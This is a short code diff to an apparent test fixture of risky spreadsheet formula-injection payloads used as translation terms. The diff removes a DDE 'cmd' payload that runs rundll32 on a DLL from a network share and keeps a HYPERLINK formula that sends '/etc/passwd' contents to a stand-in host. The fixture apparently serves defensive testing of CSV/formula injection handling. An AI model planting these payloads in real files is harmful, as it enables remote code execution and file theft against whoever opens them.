@@ -49,12 +49,8 @@ export const riskyPayloads: IntermediateTranslationFormat = {
       translation: `fifth`,
     },
     {
-      term: `=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1`,
-      translation: `sixth`,
-    },
-    {
       term: `=HYPERLINK(CONCATENATE("http://0.0.0.0:80/123.txt?v="; ('file:///etc/passwd'#$passwd.A1));"test-poc")`,
-      translation: `seventh`,
+      translation: `sixth`,
     },
   ],
 };
